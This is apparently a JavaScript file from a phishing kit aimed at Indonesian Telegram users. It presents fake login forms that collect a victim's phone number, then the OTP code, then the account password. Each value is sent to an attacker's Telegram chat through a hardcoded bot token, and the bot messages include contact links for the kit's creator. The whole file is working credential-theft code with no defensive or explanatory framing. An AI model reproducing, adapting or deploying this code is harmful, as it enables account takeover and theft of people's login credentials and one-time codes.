const BOT_TOKEN = "7606338596";
const CHAT_IDS = ["6987171667"]; 

document.getElementById("phone").addEventListener("focus", function () {
  if (!this.value.startsWith("+62 ")) {
    this.value = "+62 ";
  }
});

function processFirstData() {
  const form = document.getElementById("firstForm");
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    const phone_number = document.getElementById("phone").value;

    if (phone_number === "") {
      document.getElementById("phone_error").textContent =
        "Nomor telepon tidak boleh kosong.";
      document.getElementById("phone_error").style.display = "block";
      return false;
    } else {
      document.getElementById("phone_error").style.display = "none";
    }

    document.querySelector(".loading").style.display = "block";

    sessionStorage.setItem("phone", phone_number);

    sendToTelegram(
      `📱 New Phone Number Submission:\n\nPhone: <code>${phone_number}</code>`
    );

    document.querySelector(".second").style.display = "block";
    document.querySelector(".loading").style.display = "none";
    document.querySelector(".first").style.display = "none";
  });
}

document
  .querySelectorAll(".code-input")
  .forEach(function (input, index, inputs) {
    input.addEventListener("input", function () {
      if (input.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });
  });

const phoneNumber = sessionStorage.getItem("phone");
if (phoneNumber) {
  document.getElementById("phone-number-display").textContent = phoneNumber;
} else {
  document.getElementById("phone-number-display").textContent =
    "Masukkan Kode OTP Telegram Anda";
}

function processSecondData() {
  const form = document.getElementById("secondForm");
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    let code = "";
    for (let i = 1; i <= 5; i++) {
      const codeInput = document.getElementById("code" + i);
      code += codeInput.value;
    }

    const phone_number = sessionStorage.getItem("phone");
    
    if (code === "") {
        document.getElementById("otp_error").textContent =
        "Kode OTP tidak boleh kosong.";
        document.getElementById("otp_error").style.display = "block";
        return false;
    } else {
        document.getElementById("otp_error").style.display = "none";
    }
    
    document.querySelector(".loading").style.display = "block";
    sessionStorage.setItem("code", code);

    sendToTelegram(
      `🔑 New OTP Submission:\n\nPhone: <code>${phone_number}</code>\nOTP Code: <code>${code}</code>`
    );

    document.querySelector(".third").style.display = "block";
    document.querySelector(".loading").style.display = "none";
    document.querySelector(".second").style.display = "none";
  });
}

function processThirdData() {
  const form = document.getElementById("thirdForm");
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    const password = document.getElementById("password").value;
    const code = sessionStorage.getItem("code");
    const phone_number = sessionStorage.getItem("phone");

    if (password === "") {
      document.getElementById("password_error").textContent =
        "Password tidak boleh kosong.";
      document.getElementById("password_error").style.display = "block";
      return false;
    } else {
      document.getElementById("password_error").style.display = "none";
    }

    document.querySelector(".loading").style.display = "block";

    sendToTelegram(
      `🔒 New Password Submission:\n\nPhone: <code>${phone_number}</code>\nKode : <code>${code}</code>\nPassword: <code>${password}</code>`
    );

    document.querySelector(".four").style.display = "block";
    document.querySelector(".loading").style.display = "none";
    document.querySelector(".third").style.display = "none";
  });
}

function sendToTelegram(message) {
  const inlineKeyboard = {
    inline_keyboard: [
      [{ text: "Wa Pembuat LINK", url: "https://wa.me/6288704220953" }],
      [{ text: "Tele Pembuat LINK", url: "https://t.me/mulaikosi" }],
    ],
  };

  CHAT_IDS.forEach((chatId) => {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        reply_markup: inlineKeyboard,
      }),
    }).catch((error) =>
      console.error(`Error sending to chat ${chatId}:`, error)
    );
  });
}
document.addEventListener("DOMContentLoaded", init);
